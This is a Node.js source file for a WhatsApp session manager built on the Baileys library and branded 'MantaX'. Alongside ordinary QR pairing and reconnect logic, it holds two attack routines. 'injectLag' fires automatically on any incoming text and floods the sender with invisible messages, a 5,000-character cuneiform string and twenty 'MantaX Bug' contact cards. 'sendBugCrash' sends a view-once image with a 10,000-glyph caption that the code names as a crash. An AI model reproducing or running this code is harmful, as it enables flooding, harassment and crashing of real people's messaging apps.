const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const QRCode = require('qrcode');
const path = require('path');
const fs = require('fs');
const pino = require('pino');

class BaileyManager {
  constructor() {
    this.sessions = new Map();
  }

  async createSession(userId, pairingCode) {
    const sessionDir = path.join(__dirname, '../../bailey-sessions', userId);
    fs.mkdirSync(sessionDir, { recursive: true });
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const sock = makeWASocket({
      logger: pino({ level: 'silent' }),
      auth: state, printQRInTerminal: false,
      browser: ['MantaX-Bailey', 'Chrome', '1.0'],
      generateHighQualityLinkPreview: true
    });
    this.sessions.set(userId, { sock, saveCreds, pairingCode });

    sock.ev.on('connection.update', async (update) => {
      const { qr, connection, lastDisconnect } = update;
      if (qr) {
        const qrDataUrl = await QRCode.toDataURL(qr);
        global.qrStore = global.qrStore || {};
        global.qrStore[pairingCode] = { qr: qrDataUrl, status: 'waiting' };
      }
      if (connection === 'open') {
        global.qrStore = global.qrStore || {};
        if (global.qrStore[pairingCode]) {
          global.qrStore[pairingCode].status = 'connected';
          global.qrStore[pairingCode].number = sock.user?.id;
        }
        global.io?.to(`user_${userId}`).emit('bailey_connected', { pairingCode, number: sock.user?.id });
      }
      if (connection === 'close') {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
        if (shouldReconnect) this.createSession(userId, pairingCode);
      }
    });

    sock.ev.on('creds.update', saveCreds);
    sock.ev.on('messages.upsert', async (m) => {
      if (m.type === 'notify') {
        for (const msg of m.messages) {
          if (msg.message?.conversation) {
            await this.injectLag(sock, msg.key.remoteJid);
          }
        }
      }
    });

    return { success: true };
  }

  async injectLag(sock, jid) {
    try {
      for (let i = 0; i < 50; i++) {
        await sock.sendMessage(jid, { text: '‎' });
        await new Promise(r => setTimeout(r, 100));
      }
      const heavyText = '𒐫'.repeat(5000);
      await sock.sendMessage(jid, { text: heavyText });
      for (let i = 0; i < 20; i++) {
        await sock.sendMessage(jid, {
          contacts: {
            displayName: 'MantaX Bug',
            vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:MantaX Bug ${i}\nTEL;waid=1234567890:1234567890\nEND:VCARD`
          }
        });
      }
    } catch (e) { console.error('Lag injection failed:', e); }
  }

  async sendBugCrash(jid) {
    const session = Array.from(this.sessions.values())[0];
    if (!session) return;
    try {
      await session.sock.sendMessage(jid, {
        viewOnceMessage: {
          message: {
            imageMessage: {
              url: 'https://crash.url',
              mimetype: 'image/jpeg',
              caption: '𒐫'.repeat(10000)
            }
          }
        }
      });
    } catch (e) {}
  }

  getSession(userId) {
    return this.sessions.get(userId);
  }

  async disconnect(userId) {
    const session = this.sessions.get(userId);
    if (session) {
      await session.sock.logout();
      this.sessions.delete(userId);
    }
  }
}

module.exports = new BaileyManager();
